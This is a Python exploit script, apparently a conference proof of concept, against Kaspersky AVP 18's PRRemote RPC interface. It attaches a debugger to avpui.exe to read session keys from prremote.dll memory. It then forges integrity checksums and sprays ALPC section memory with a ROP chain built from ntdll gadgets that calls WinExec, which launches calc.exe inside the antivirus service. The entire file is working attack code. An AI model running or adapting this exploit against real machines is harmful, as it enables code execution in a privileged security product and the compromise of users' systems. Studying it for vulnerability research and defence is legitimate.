#!/usr/bin/python
# -*- coding: utf-8 -*-

# Slightly cleaned up version for AlligatorCon'19
#           .-._   _ _ _ _ _ _ _ _
# .-''-.__.-'00  '-' ' ' ' ' ' ' ' '-.
# '.___ '    .   .--_'-' '-' '-' _'-' '._
#  V: V 'vv-'   '_   '.       .'  _..' '.'.
#    '=.____.=_.--'   :_.__.__:_   '.   : :
#            (((____.-'        '-.  /   : :
#  snd                         (((-'\ .' /
#                            _____..'  .'
#                           '-._____.-'
#
#     VICCNEK HITTÉK - EGY KAJMÁN VOLT

from winappdbg import * # Greetz to Mario!
from ctypes import *
from winappdbg.win32 import *
import sys
import struct
import time
import windows.rpc
from windows.rpc import ndr
from windows.generated_def.ntstatus import NtStatusException
from fnv_hash import *
import windows.generated_def as gdef
import os 
import re

lengths={}
mods=[]
bbs=[]

offsets={"1.8.145.39": {"secrets": 0x73938}}
target_ver="1.8.145.39"

# src: http://code.activestate.com/recipes/305279-getting-process-information-on-windows/
def EnumProcesses():
    #PSAPI.DLL
    psapi = windll.psapi
    #Kernel32.DLL
    kernel = windll.kernel32

    arr = c_ulong * 256
    lpidProcess= arr()
    cb = sizeof(lpidProcess)
    cbNeeded = c_ulong()
    hModule = c_ulong()
    count = c_ulong()
    modname = c_buffer(30)
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_READ = 0x0010
    
    #Call Enumprocesses to get hold of process id's
    psapi.EnumProcesses(byref(lpidProcess),
                        cb,
                        byref(cbNeeded))
    
    #Number of processes returned
    nReturned = cbNeeded.value/sizeof(c_ulong())
    
    pidProcess = [i for i in lpidProcess][:nReturned]

    ret = []
    for pid in pidProcess:
        
        #Get handle to the process based on PID
        hProcess = kernel.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                                      False, pid)
        if hProcess:
            psapi.EnumProcessModules(hProcess, byref(hModule), sizeof(hModule), byref(count))
            psapi.GetModuleBaseNameA(hProcess, hModule.value, modname, sizeof(modname))
            ret.append((pid,"".join([ i for i in modname if i != '\x00'])))
            
            #-- Clean up
            for i in range(modname._length_):
                modname[i]='\x00'
    return ret

def show_pkt(pkt):
    for i,dw in enumerate(pkt):
        sys.stdout.write("0x%08X " % dw)
        if (i+1) % 8 == 0:
            print("")

class MyEventHandler( EventHandler ):
    pass

procs = EnumProcesses()
avpui_pid = None
avp_pid = None


pid_re=re.compile("[0-9]+")
for l in os.popen("sc queryex AVP18.0.0").read().split("\n"):
    print l, "x"
    if "PID" in l:
        m=pid_re.search(l)
        if m is not None:
            avp_pid=int(m.group(0))
        else:
            print("[-] Something is wrong, can't get AVP PID")
            exit()


secrets = None

for pid, pname in procs:
    if pname.lower() == "avpui.exe":
        avpui_pid = pid
    if avp_pid is not None and avpui_pid is not None:
        break

print("[*] AVP UI: %d" % (avpui_pid))
print("[*]AVP: %d" % (avp_pid))

ntdll_base=windll.LoadLibrary("ntdll.dll")._handle
kernel32_base=windll.LoadLibrary("kernel32.dll")._handle
winexec=windll.kernel32.GetProcAddress(kernel32_base, "WinExec")
print "[*] WinExec at: %08x" % winexec

prremote_base=None
if len(sys.argv)>4:
    secrets=struct.pack("<4I",int(sys.argv[1],16),int(sys.argv[2],16),int(sys.argv[3],16),int(sys.argv[4],16))
else:
    # Instance a Debug object using the "with" statement.
    # Note how we don't need to call "debug.stop()" anymore.

    with Debug( MyEventHandler(), bKillOnExit = True ) as debug:
        # Start a new process for debugging.
        process = debug.attach( avpui_pid )
        # Wait for the debugee to finish.
        prremote=process.get_module_by_name("prremote.dll")
        prremote_base=prremote.get_base()
        
        print("[+] PRREMOTE @ %08x" % (prremote_base)) 
        secrets_ptr0=struct.unpack("<I",process.read(prremote_base+offsets[target_ver]["secrets"],4))[0]
        secrets_ptr1=struct.unpack("<I",process.read(secrets_ptr0,4))[0]
        secrets=process.read(secrets_ptr1+0x40,16) # Identical for client and server
        debug.detach_from_all()

print("[+] Done.")

session0, session1, key0, key1 = struct.unpack("<IIII", secrets)

print "[+] Secrets: %08X %08X %08X %08X" % (session0, session1, key0, key1)

fnv=FNV_hash()

fnv.set_key(struct.pack("<I",key0),struct.pack("<I",key1))
fnv.set_sid(struct.pack("<I",session0),struct.pack("<I",session1))
fnv.set_payload("00".decode('hex'))
fnv.set_msgid('0000000000000000'.decode('hex'))
res1,res0=fnv.run()

print("[+] Checksums: %08x %08x" % (res0, res1))


# Incremented sess0 doesn't seem to affect the integrity check
# If needed, increment after FNV is calculated
session0+=0 # <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< EDIT HERE IF SESSION CHECK FAILS!

if True:
    size=32

    pkt=[0x00000000, 0x00000000, 0x00000000, 0x00000000, 0x00320101, 0x00000001, 0xFFFA783B, 0x0074FD38, 
        0x51930001, 0xEA0A1587, 0x00002882, 0x00000000, 0x00000000, 0x00000000, 0x00d60000, 0x00020000, 
        0x00190000, 0x00000000, 0x00000000, 0x133700C3, 0x00000003, 0xEA8F0000, 0x147ACDED, 0x81000000, 
        0xa1000302, 0x000014f6, 0xE9817096, 0xB1CFBDEF, 0x02678CBD, 0x00000091, 0x780E8100, 0x32003300, 
        0x62006400, 0x20006700, 0x20002D00, 0x69004600, 0x65006C00, 0x20003A00, 0x76006100, 0x2E007000, 
        0x78006500, 0x20006500, 0x20002D00, 0x49005000, 0x3A004400, 0x36002000, 0x30003400, 0x2D002000, 
        0x4D002000, 0x64006F00, 0x6C007500, 0x3A006500, 0x70002000, 0x72007200, 0x6D006500, 0x74006F00, 
        0x2E006500, 0x6C006400, 0x20006C00, 0x20002D00, 0x68005400, 0x7FFFFFFF]   

    pkt[20]=0
    pkt[19]=(pkt[19] & 0x0000ffff) + (size << 16) 
    
    print("Result:")
    pkt[6]=session0
    pkt[7]=session1

    pkt[8] = (pkt[8] & 0x0000ffff) | ((res0 & 0x0000ffff) << 16)
    pkt[9] = (pkt[9] & 0xffff0000) | ((res0 & 0xffff0000) >> 16)
    pkt[9] = (pkt[9] & 0x0000ffff) | ((res1 & 0x0000ffff) << 16)
    pkt[10] = (pkt[10] & 0xffff0000) | ((res1 &0xffff0000) >> 16)

    print "\n","="*16

    SECTION_SIZE=0x10000000

    for spray_start in xrange(0x1AFF0400,0x20FF0400,0x1000000):
        print("[+] Trying spray at %08x" % (spray_start))
        pkt[24] = (pkt[24] & 0x0000ffff) | ((spray_start & 0x0000ffff) << 16)
        pkt[25] = (pkt[25] & 0xffff0000) | ((spray_start & 0xffff0000) >> 16)

        # SELFPTR                    SELFPTR SELFPTR SELFPTR
        # [ADD ESP,0x14;POP EBP;RET] SELFPTR SELFPTR SELFPTR    ; 2) Move ESP to arb. controlled area
        # SELFPTR                    SELFPTR SELFPTR SELFPTR
        # SELFPTR                    SELFPTR SELFPTR 
        # [POP EBX;RET]                                         ; 3) Load function pointer
        # WinExec
        # [POP EDI; RET]                                        ; 4) Load parameter
        # Command
        # [PUSH EDI; CALL EBX]                                  ; 5) Function call
        # [MOV ESP,ESI;POP ... ;RET 0x10] * 12                  ; 1) Set ESP
        filler= [spray_start+0xc]*4 + [ntdll_base+0x6f408] + \
                [spray_start+0xc]*4 + [spray_start+0x7000] + [spray_start+0xc]*5 + \
                [ntdll_base+0x165be, winexec, ntdll_base+0x1dc9d, spray_start+0x100, ntdll_base+0x70c46] + \
                [ntdll_base+0x68f1e]*12
        filler_packed=struct.pack("<%dI" % len(filler),*filler)
        
        try:
            client = windows.rpc.RPCClient(r"\RPC Control\PRRemote:%d" % int(avp_pid) )
            iid = client.bind("806411e0-2ed2-194f-bb8c-e27194948ac1")
            ndr_params = ndr.make_parameters([ndr.NdrLong]*len(pkt))
            

            section = client.alpc_client.create_port_section(0x40000, 0, SECTION_SIZE)
            view = client.alpc_client.map_section(section[0], SECTION_SIZE)
            IF_NUMBER = client.if_bind_number[hash(buffer(iid)[:])]
            call_req = client._forge_call_request(IF_NUMBER, 4, "")
            
            params=ndr_params.pack(pkt)
            p = windows.alpc.AlpcMessage(0x2000)
            p.port_message.data = call_req + ndr.NdrLong.pack(len(params) + 0x200) + "\x00" * 40
            p.attributes.ValidAttributes |= gdef.ALPC_MESSAGE_VIEW_ATTRIBUTE
            p.view_attribute.Flags = 0x40000
            p.view_attribute.ViewBase = view.ViewBase
            p.view_attribute.SectionHandle = view.SectionHandle
            p.view_attribute.ViewSize = SECTION_SIZE
            print "[+] ViewBase: %08x" % view.ViewBase
            windows.current_process.write_memory(view.ViewBase, filler_packed*(SECTION_SIZE/len(filler_packed)))
            windows.current_process.write_memory(view.ViewBase, params)
            for c in xrange(view.ViewBase, view.ViewBase+SECTION_SIZE, 0x10000):
                windows.current_process.write_memory(c+0x500, "c:\\windows\\system32\\calc.exe\x00")
            client.alpc_client.send(p)
            time.sleep(1.5) # free up some memory
        except ValueError as e:
            print("[-] FAIL: invalid session?")
        except NtStatusException:
            print("[+] Likely success!")
            break
